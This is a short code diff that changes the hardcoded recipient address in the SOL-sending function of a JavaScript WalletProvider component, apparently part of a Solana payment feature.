@@ -143,7 +143,7 @@ export function WalletProvider(props) {
       alert("Please connect wallet.");
       return;
     }
-    const recipientAddress = "6tYJYF2uEPMqTvYLsdV6Uz1A5at4h5bL5qei6nB8hk63";
+    const recipientAddress = "CqQq7oBtMjoRfaxipxWpzZeu4aQfRSN7tRivpqTD7boY";
     let transaction = new web3.Transaction();
     console.log(`Sending ${sol} SOL`);
     transaction.add(
